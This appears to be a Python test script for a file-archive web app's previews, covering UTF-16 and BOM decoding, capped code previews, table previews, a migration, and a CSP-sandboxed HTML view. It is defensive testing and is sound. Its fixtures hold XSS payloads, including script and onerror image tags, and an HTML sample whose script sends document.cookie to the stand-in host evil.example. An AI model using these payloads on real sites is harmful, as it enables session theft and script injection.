#!/usr/bin/env python3
"""Self-contained check for table previews (#606) and big / HTML / UTF-16 files (#607).

Throwaway DB/storage/exports (scripts/_testenv.py), the real FastAPI app through TestClient. Every
fixture is generated here at run time (nothing committed). Needs openpyxl for the xlsx part (it is in
the app image); run it inside the test container or anywhere the requirements are installed:

    python scripts/test_previews_606_607.py

Covers: BOM / UTF-16 detection and the readers that use it (code, data, text, markdown, text stats),
the capped code preview, the text endpoint (cap, auth), the rendered-HTML endpoint (CSP headers,
policy, auth) and its sandboxed frame, the table preview markup + layout variant, and the one-time
re-extract migration (counts, idempotence). Exits 1 if any check fails.
"""
import codecs
import html as htmlmod
import io
import os
import re
import sys
import types

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import _testenv  # noqa: E402
TMP = _testenv.isolate("previews606607-")
os.environ["CAPTION_DISABLED"] = "1"
ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
sys.path.insert(0, ROOT)
sys.modules.setdefault("cairosvg", types.ModuleType("cairosvg"))  # no libcairo needed here

from pathlib import Path  # noqa: E402
from core import db, object_types, storage  # noqa: E402
from core.object_types import _textstats, code as code_type  # noqa: E402
_testenv.assert_isolated()

FAILS = []


def check(name, cond, extra=""):
    print(("PASS " if cond else "FAIL ") + name + (f"  [{extra}]" if (extra and not cond) else ""))
    if not cond:
        FAILS.append(name)


# ---- 1. encoding detection ---------------------------------------------------------------------
SAMPLE = "<html><title>Report zqenc</title>Zoë Müller – 日本語 line one\nline two\n"
cases = {
    "utf-8": (SAMPLE.encode("utf-8"), "utf-8"),
    "utf-8-sig": (codecs.BOM_UTF8 + SAMPLE.encode("utf-8"), "utf-8-sig"),
    "utf-16-le-bom": (codecs.BOM_UTF16_LE + SAMPLE.encode("utf-16-le"), "utf-16"),
    "utf-16-be-bom": (codecs.BOM_UTF16_BE + SAMPLE.encode("utf-16-be"), "utf-16"),
    "utf-32-le-bom": (codecs.BOM_UTF32_LE + SAMPLE.encode("utf-32-le"), "utf-32"),
    "utf-32-be-bom": (codecs.BOM_UTF32_BE + SAMPLE.encode("utf-32-be"), "utf-32"),
}
ascii_text = "<html><body>" + "plain ascii text for the heuristic, long enough to sample. " * 20 + "</body></html>\n"
cases["utf-16-le-nobom"] = (ascii_text.encode("utf-16-le"), "utf-16-le")
cases["utf-16-be-nobom"] = (ascii_text.encode("utf-16-be"), "utf-16-be")
TMPD = Path(TMP)
for name, (data, want_codec) in cases.items():
    got, label = _textstats.detect_encoding(data)
    check(f"detect {name} -> {want_codec}", got == want_codec, (got, label))
    f = TMPD / f"enc-{name}.txt"
    f.write_bytes(data)
    text = _textstats.read_text(f, 10_000)
    want = ascii_text if "nobom" in name else SAMPLE
    check(f"read_text {name} decodes exactly (no BOM char, no NULs)", text == want, repr(text[:50]))
    st = _textstats.text_file_stats(f, 1_000_000)
    check(f"text_file_stats {name}: lines {want.count(chr(10))} + encoding label", st.get("lines") == want.count("\n") + (0 if want.endswith("\n") else 1)
          and ("UTF-8" in st.get("encoding", "") if name.startswith("utf-8") else name.split("-")[0].upper() + "-" + name.split("-")[1] in st.get("encoding", "")),
          st)
    n, complete = _textstats.count_lines(f, 1_000_000)
    check(f"count_lines {name}", complete and n == want.count("\n"), (n, complete))
for name in ("binary", "latin1", "empty", "tiny"):
    data = {"binary": bytes(range(256)) * 20, "latin1": "caf\xe9 cr\xe8me\n".encode("latin-1") * 40, "empty": b"", "tiny": b"ab"}[name]
    got, _ = _textstats.detect_encoding(data)
    check(f"detect {name}: stays utf-8 (decoded with replacement, never raises)", got == "utf-8", got)
    f = TMPD / f"enc-{name}.bin"
    f.write_bytes(data)
    _textstats.read_text(f, 10_000)
f = TMPD / "lines.txt"
f.write_text("a\n" * 5000, encoding="utf-8")
txt, shown, cut = _textstats.read_head_lines(f, 2000, 200_000)
check("read_head_lines: stops at the line cap and says it was cut", shown == 2000 and cut and txt.count("\n") == 2000, (shown, cut))
txt, shown, cut = _textstats.read_head_lines(f, 99999, 100)
check("read_head_lines: stops at the char cap", cut and len(txt) <= 100, (len(txt), cut))
f.write_text("x" * 1_000_000, encoding="utf-8")
txt, shown, cut = _textstats.read_head_lines(f, 2000, 5000)
check("read_head_lines: a one-line 1 MB file is cut mid-line, not skipped", cut and len(txt) == 5000 and shown == 1, (len(txt), shown, cut))
n, complete = _textstats.count_lines(f, 1000)
check("count_lines: budget exhausted -> lower bound, complete False", not complete)
f.write_text("tiny file\nsecond", encoding="utf-8")
txt, shown, cut = _textstats.read_head_lines(f, 2000, 5000)
check("read_head_lines: a small file is whole and not cut", txt == "tiny file\nsecond" and not cut and shown == 2)

# ---- 2. registry contract ----------------------------------------------------------------------
check("data and spreadsheet declare preview_layout='table'", object_types.get_object_type("data").preview_layout == "table"
      and object_types.get_object_type("spreadsheet").preview_layout == "table")
check("every other type keeps the default layout", all(s.preview_layout == "default" for k, s in object_types.OBJECT_TYPES.items() if k not in ("data", "spreadsheet")))
try:
    object_types.register(object_types.ObjectTypeSpec(key="zz_bad_layout", label="x", thumbnail_source=object_types.ThumbnailSource.NONE, ocr_capable=False, preview_fn=lambda c: None, properties_fn=lambda r: {},
                                                      preview_layout="sideways"))
    check("a bad preview_layout is refused at registration", False)
except object_types.ObjectTypeContractError:
    check("a bad preview_layout is refused at registration", True)

# ---- 3. the app: uploads ----------------------------------------------------------------------
db.init_db()
from fastapi.testclient import TestClient  # noqa: E402
from web import app as webapp  # noqa: E402

client = _testenv.client(webapp.app, raise_server_exceptions=False)
anon = TestClient(webapp.app, raise_server_exceptions=False)
with client:
    pass


def upload(name, data, ctype="application/octet-stream"):
    r = client.post("/api/upload", files={"file": (name, data, ctype)})
    assert r.status_code == 200, (name, r.status_code, r.text[:200])
    return r.json().get("slug") or r.json().get("object", {}).get("slug")


def row(slug):
    return db.get_by_slug(slug)


REPORT = "<html><head><title>Group Policy Results zqgp</title><style>h1{color:#036}</style></head><body><h1>RSOP</h1>" \
         + "".join(f"<p>Setting {i}: Administrative Templates item {i} is Enabled</p>\n" for i in range(400)) + "</body></html>"
S = {}
S["utf16"] = upload("report-utf16.html", codecs.BOM_UTF16_LE + REPORT.encode("utf-16-le"))
S["utf16be"] = upload("report-utf16be.html", codecs.BOM_UTF16_BE + REPORT.encode("utf-16-be"))
S["utf16nobom"] = upload("report-nobom.html", REPORT.encode("utf-16-le"))
S["utf8sig"] = upload("sig.html", codecs.BOM_UTF8 + REPORT.encode("utf-8"))
S["csv16"] = upload("people16.csv", codecs.BOM_UTF16_LE + "name,city\nZoë,Malmö zqcsv16\nBjörn,Göteborg\n".encode("utf-16-le"))
TXT16 = "first line zqtxt16\n" + "second line of the note, padded out a bit\n" * 3
S["txt16"] = upload("notes16.txt", codecs.BOM_UTF16_LE + TXT16.encode("utf-16-le"))
S["md16"] = upload("doc16.md", codecs.BOM_UTF16_LE + "# Title zqmd16\n\nSome *markdown* body.\n".encode("utf-16-le"))
for k in ("utf16", "utf16be", "utf16nobom", "utf8sig", "csv16", "txt16", "md16"):
    check(f"{k}: typed as expected", row(S[k])["media_type"] in ("code", "data", "text", "markdown"), row(S[k])["media_type"])

print("\n--- #607 part 3: UTF-16 text extraction ---")
for k in ("utf16", "utf16be", "utf16nobom", "utf8sig"):
    t = row(S[k])["extracted_text"]
    check(f"{k}: extracted_text is the full decoded report (no NULs, no BOM)", t == REPORT.strip() and "\x00" not in t and not t.startswith("﻿"), (len(t), repr(t[:40])))
check("csv16: extracted text", row(S["csv16"])["extracted_text"].startswith("name,city") and "Malmö zqcsv16" in row(S["csv16"])["extracted_text"])
check("txt16: extracted text", row(S["txt16"])["extracted_text"] == TXT16.strip())
check("md16: extracted text", row(S["md16"])["extracted_text"].startswith("# Title zqmd16"))
check("md16: rendered as markdown from the UTF-16 file", "<h1>Title zqmd16</h1>" in client.get(f"/object/{S['md16']}").text)
check("search finds the UTF-16 report", S["utf16"] in [r["slug"] for r in db.search(query="zqgp")])
check("search finds the UTF-16 csv", S["csv16"] in [r["slug"] for r in db.search(query="zqcsv16")])
p = client.get(f"/object/{S['utf16']}").text
props = dict(re.findall(r"<span>([^:<]+): ([^<]*)</span>", p))
check("properties: Encoding says UTF-16 LE (BOM)", props.get("Encoding") == "UTF-16 LE (BOM)", props)
check("properties: Lines counted from the decoded text", props.get("Lines") == f"{REPORT.count(chr(10)) + 1:,}", props.get("Lines"))
pc = client.get(f"/object/{S['csv16']}").text
pp = dict(re.findall(r"<span>([^:<]+): ([^<]*)</span>", pc))
check("csv16: 2 columns, 2 rows, headers", pp.get("Columns") == "2" and pp.get("Rows") == "2" and pp.get("Headers") == "name, city", pp)
check("csv16: table preview has the decoded cells", "<td title=\"Malmö zqcsv16\">Malmö zqcsv16</td>" in pc)

# ---- 4. big files: capped code preview, nothing inlined ------------------------------------------
print("\n--- #607 part 1: big files ---")
big_rows = "".join(f"<tr><td>{i}</td><td>Inventory line {i} of the final catalog, padded with a little filler text</td></tr>\n" for i in range(30000))
BIG = "<!DOCTYPE html><html><head><title>Big page zqbig</title></head><body><table>\n" + big_rows + "</table></body></html>\n"
S["big"] = upload("final (1).html", BIG.encode("utf-8"))
bigsize = len(BIG.encode("utf-8"))
page = client.get(f"/object/{S['big']}").text
print(f"   file {bigsize:,} bytes, extracted_text {len(row(S['big'])['extracted_text']):,} chars, object page {len(page.encode()):,} bytes")
check("big html: object page under 300 KB", len(page.encode("utf-8")) < 300_000, len(page.encode()))
m = re.search(r"Showing the first ([\d,]+) of ([\d,]+) lines", page)
check("big html: 'Showing the first N of M lines' note", m is not None and int(m.group(2).replace(",", "")) >= 30000 and int(m.group(1).replace(",", "")) <= 2000, m and m.group(0))
check("big html: Download link, no Open raw (a raw .html would run in the app's origin)", "download>Download</a>" in page and "Open raw" not in page)
check("big html: unhighlighted (data-nohl)", 'data-nohl="1"' in page)
check("big html: extracted text is not embedded in the page", "let ocrText" not in page and "Inventory line 29999" not in page and "ocrChars = " in page)
check("big html: the OCR tooltip is a short label, never the text", "ocrLamp.title = ocrText" not in page and "' of text'" in page)
check("big html: link scan is capped", "OCR_LINK_SCAN_CHARS" in page and "slice(0, OCR_LINK_SCAN_CHARS)" in page)
small = client.get(f"/object/{S['utf16']}").text
check("small html: no 'Showing the first N of M lines' note", re.search(r"Showing the first [\d,]+ of [\d,]+ lines", small) is None)
js = upload("x.js", ("// minified\n" + "var a=1;" * 200_000).encode())
pj = client.get(f"/object/{js}").text
check("one-line 1.6 MB js: still previewed, cut with a note, page stays small", "Showing the first 1 of" in pj and len(pj.encode()) < 300_000, len(pj.encode()))
check("non-html code: Open raw link offered", "Open raw" in pj)
check("non-html code: no Rendered/Code toggle", 'id="html-preview"' not in pj)
hostile = upload("evil.js", b"</code></pre><script>alert(1)</script><img src=x onerror=alert(2)>")
ph = client.get(f"/object/{hostile}").text
check("hostile source is escaped in the code preview", "&lt;/code&gt;&lt;/pre&gt;&lt;script&gt;alert(1)" in ph and "<script>alert(1)" not in ph and "<img src=x onerror" not in ph)

print("\n--- text endpoint ---")
r = client.get(f"/api/image/{S['big']}/text")
j = r.json()
check("text: default cap 100,000 chars", r.status_code == 200 and len(j["text"]) == 100_000 and j["truncated"] and j["chars"] == len(row(S["big"])["extracted_text"]), (r.status_code, len(j.get("text", ""))))
j = client.get(f"/api/image/{S['big']}/text?limit=99999999").json()
check("text: limit is clamped to 1,000,000", j["limit"] == 1_000_000 and len(j["text"]) <= 1_000_000)
j = client.get(f"/api/image/{S['big']}/text?limit=0").json()
check("text: limit 0 is clamped up to 1", j["limit"] == 1 and len(j["text"]) == 1)
j = client.get(f"/api/image/{S['txt16']}/text").json()
check("text: a short text comes whole, not truncated", j["text"] == TXT16.strip() and not j["truncated"] and j["ocr_status"] == "done")
check("text: anonymous -> 401", anon.get(f"/api/image/{S['big']}/text").status_code == 401)
check("text: unknown slug -> 404", client.get("/api/image/nosuch/text").status_code == 404)

# ---- 5. HTML: sandboxed rendered view ------------------------------------------------------------
print("\n--- #607 part 2: rendered view ---")
EVIL = ("<html><body><h1>Hello zqrender</h1><script>fetch('http://evil.example/x?c='+document.cookie)</script>"
        "<img src='http://evil.example/a.png'><form action='http://evil.example/p'><input name=a></form></body></html>")
S["evil"] = upload("evil.html", EVIL.encode())
r = client.get(f"/api/image/{S['evil']}/rendered")
csp = r.headers.get("content-security-policy", "")
print("   CSP:", csp)
check("rendered: 200 text/html utf-8", r.status_code == 200 and r.headers["content-type"].lower() == "text/html; charset=utf-8")
check("rendered: CSP starts with sandbox (no tokens) and has default-src 'none'", csp.startswith("sandbox;") and "default-src 'none'" in csp
      and not re.search(r"sandbox\s+allow-", csp))
check("rendered: CSP allows no network origin at all", "http" not in csp and "'self'" not in csp.replace("frame-ancestors 'self'", "") and "connect-src" not in csp)
check("rendered: CSP shuts forms and <base>", "form-action 'none'" in csp and "base-uri 'none'" in csp)
check("rendered: only data: images", "img-src data:" in csp)
check("rendered: nosniff, no-referrer", r.headers.get("x-content-type-options") == "nosniff" and r.headers.get("referrer-policy") == "no-referrer")
check("rendered: body is the page as saved", "zqrender" in r.text and "fetch('http://evil.example" in r.text)
page = client.get(f"/object/{S['evil']}").text
check("frame: sandbox attribute is empty (every restriction on)", re.search(r'<iframe[^>]*\bsandbox=""', page) is not None)
check("frame: no allow-same-origin / allow-scripts / allow-top-navigation anywhere on the page",
      not any(t in page for t in ("allow-same-origin", "allow-scripts", "allow-top-navigation", "allow-popups")))
check("frame: loads lazily from the dedicated endpoint, no referrer", f'data-src="/api/image/{S["evil"]}/rendered"' in page and 'loading="lazy"' in page and 'referrerpolicy="no-referrer"' in page)
check("toggle: Rendered and Code buttons, choice kept in localStorage", 'data-view="rendered"' in page and 'data-view="code"' in page and "constructicon.htmlPreviewView" in page)
check("toggle: the code pane holds the capped source, escaped", "&lt;script&gt;fetch(" in page)
check("frame: fixed-height scroll box", ".hp-frame { display: block; width: 100%; height: 70vh" in page)
rb = client.get(f"/api/image/{S['utf16']}/rendered")
check("rendered: UTF-16 report is normalised to readable UTF-8", rb.status_code == 200 and "<title>Group Policy Results zqgp</title>" in rb.text
      and "\x00" not in rb.text and not rb.text.startswith("﻿"))
rb = client.get(f"/api/image/{S['utf8sig']}/rendered")
check("rendered: UTF-8-with-BOM page loses its BOM", rb.status_code == 200 and not rb.text.startswith("﻿"))
check("rendered: a non-HTML item -> 404", client.get(f"/api/image/{S['csv16']}/rendered").status_code == 404)
check("rendered: a .js code item -> 404", client.get(f"/api/image/{js}/rendered").status_code == 404)
check("rendered: unknown slug -> 404", client.get("/api/image/nosuch/rendered").status_code == 404)
check("rendered: anonymous -> 401", anon.get(f"/api/image/{S['evil']}/rendered").status_code == 401)
check("rendered: big page object stays light (frame waits for a click)", 'data-big="0"' in client.get(f"/object/{S['evil']}").text)

# policy: a restricted item is invisible to a non-admin, and the endpoint says so (404)
from core import policy, roles  # noqa: E402
orig = policy.can_view
policy.can_view = lambda row, actor=None: False
try:
    check("rendered: refused (404) when the item policy says no", client.get(f"/api/image/{S['evil']}/rendered").status_code == 404)
    check("text: refused (404) when the item policy says no", client.get(f"/api/image/{S['big']}/text").status_code == 404)
finally:
    policy.can_view = orig
check("rendered: served again once the policy allows", client.get(f"/api/image/{S['evil']}/rendered").status_code == 200)

# ---- 6. table previews -----------------------------------------------------------------------
print("\n--- #606: table previews ---")
long_id = "<CAKz" + "a1b2c3d4" * 30 + "@mail.gmail.com>"
hdr = ",".join(f"Col{i}" for i in range(14))
lines = [hdr] + [",".join([long_id] + [f"value {r}-{c}" for c in range(1, 13)] + ['"<img src=x onerror=alert(1)> & co"']) for r in range(30)]
S["wide"] = upload("wide.csv", ("\n".join(lines) + "\n").encode())
pw = client.get(f"/object/{S['wide']}").text
check("csv: the hero takes the table variant", 'class="dp-hero-left dp-wide dp-table"' in pw)
tbody = re.search(r"<tbody>(.*?)</tbody>", pw, re.S).group(1)
check("csv: 20 preview rows", tbody.count("<tr>") == 20, tbody.count("<tr>"))
check("csv: every cell carries its value as a title", len(re.findall(r"<td title=\"[^\"]*\">", tbody)) == 20 * 14)
check("csv: a 250-char Message-ID is whole in the cell (cut only past 400 chars)", htmlmod.escape(long_id) in tbody)
check("csv: hostile cell escaped (text and title)", "<img src=x" not in pw.split("data-preview")[1] and "&lt;img src=x onerror=alert(1)&gt; &amp; co" in tbody)
check("csv: 'Showing the first 20 of 30 rows' note keeps its own class", 'class="muted data-preview-note">Showing the first 20 of 30 rows' in pw)
for needle, why in (("white-space: nowrap", "no wrapping"), ("text-overflow: ellipsis", "ellipsis"), ("max-width: 32ch", "per-column max width"),
                    ("position: sticky", "sticky header + first column"), ("th:first-child", "sticky first column"), ("td.dt-open", "click to expand")):
    check(f"table CSS shipped: {why}", needle in pw)
css = (Path(ROOT) / "web/static/css/details.css").read_text(encoding="utf-8")
check("details.css: the table variant takes the full width and stops the flex row",
      ".dp-hero-left.dp-wide.dp-table { flex: 1 1 100%; max-width: none" in css and ".dp-table .detail-preview { display: block" in css)
check("details.css: the image column rule is unchanged (max 700 px)", ".dp-hero-left.dp-wide { width: auto; flex: 1 1 440px; max-width: 700px; }" in css)
check("a code item keeps the image-width column", 'class="dp-hero-left dp-wide"' in client.get(f"/object/{S['utf16']}").text
      and "dp-wide dp-table" not in client.get(f"/object/{S['utf16']}").text)

try:
    from openpyxl import Workbook
except ImportError:  # silent-ok: the xlsx half needs openpyxl (in the app image); say so rather than pass quietly
    Workbook = None
    print("SKIP xlsx checks: openpyxl is not installed here")
if Workbook:
    wb = Workbook()
    ws = wb.active
    ws.title = "Inventory"
    ws.append([f"Column {c}" for c in range(1, 19)])
    for r in range(1, 41):
        ws.append([f"ITEM-{r:04d}"] + [f"value r{r} c{c} " + "x" * (c * 3) for c in range(2, 19)])
    ws2 = wb.create_sheet("Notes")
    ws2.append(["Note", "Detail"])
    ws2.append(["a", "zqxlsx606"])
    buf = io.BytesIO()
    wb.save(buf)
    S["xlsx"] = upload("many-columns.xlsx", buf.getvalue())
    px = client.get(f"/object/{S['xlsx']}").text
    check("xlsx: typed spreadsheet, takes the table variant", row(S["xlsx"])["media_type"] == "spreadsheet" and 'class="dp-hero-left dp-wide dp-table"' in px)
    check("xlsx: both sheets as blocks, first open", px.count('<details class="sheet-preview"') == 2 and '<details class="sheet-preview" open>' in px)
    first = re.search(r"<tbody>(.*?)</tbody>", px, re.S).group(1)
    check("xlsx: 20 preview rows, cells with titles", first.count("<tr>") == 20 and '<td title="ITEM-0001">ITEM-0001</td>' in first)
    check("xlsx: 18 columns in the header", len(re.findall(r"<th title=\"Column \d+\">", px)) == 18)

# ---- 7. the one-time re-extract migration -----------------------------------------------------
print("\n--- #607 part 3: migration ---")
good = row(S["txt16"])["extracted_text"]
conn = db.get_conn()
broken = "��<\x00h\x00t\x00m\x00l\x00>\x00" * 30  # what the old UTF-8 reader stored for a UTF-16 file
for k in ("utf16", "utf16nobom", "csv16", "txt16", "md16"):
    conn.execute("UPDATE capture_events SET extracted_text = ? WHERE slug = ?", (broken, S[k]))
conn.execute("UPDATE capture_events SET extracted_text = 'x' WHERE slug = ?", (S["utf8sig"],))  # UTF-8-BOM: not a UTF-16 case, must stay
conn.execute("DELETE FROM schema_migrations WHERE name = 'reextract_utf16_text_607'")
conn.commit()
conn.close()
check("the migration is registered", "reextract_utf16_text_607" in [n for n, _ in db.MIGRATIONS])
check("and pending", "reextract_utf16_text_607" in db.pending_migrations())
ran = db.run_pending_migrations()
check("run_pending_migrations applied it", "reextract_utf16_text_607" in ran, ran)
check("utf16 report re-extracted in full", row(S["utf16"])["extracted_text"] == REPORT.strip())
check("utf16 (no BOM) re-extracted", row(S["utf16nobom"])["extracted_text"] == REPORT.strip())
check("utf16 csv / txt / md re-extracted", row(S["csv16"])["extracted_text"].startswith("name,city") and row(S["txt16"])["extracted_text"] == good
      and row(S["md16"])["extracted_text"].startswith("# Title zqmd16"))
check("a short text of a non-UTF-16 file is left alone", row(S["utf8sig"])["extracted_text"] == "x")
check("the big UTF-8 html was not touched", len(row(S["big"])["extracted_text"]) > 100_000)
check("search works again for the repaired rows", S["utf16"] in [r["slug"] for r in db.search(query="zqgp")])
conn = db.get_conn()
conn.execute("UPDATE capture_events SET extracted_text = ? WHERE slug = ?", (broken, S["utf16"]))
conn.commit()
conn.close()
check("marked done: a second run does nothing (even with a broken row present)", db.run_pending_migrations() == [] and "\x00" in row(S["utf16"])["extracted_text"])
conn = db.get_conn()
conn.execute("DELETE FROM schema_migrations WHERE name = 'reextract_utf16_text_607'")
conn.commit()
conn.close()
db.run_pending_migrations()
before = row(S["utf16"])["extracted_text"]
conn = db.get_conn()
conn.execute("DELETE FROM schema_migrations WHERE name = 'reextract_utf16_text_607'")
conn.commit()
conn.close()
db.run_pending_migrations()
check("idempotent: re-running over repaired rows changes nothing", row(S["utf16"])["extracted_text"] == before == REPORT.strip())

print("\nALL PASS" if not FAILS else f"\n{len(FAILS)} FAILED: {FAILS}")
sys.exit(1 if FAILS else 0)
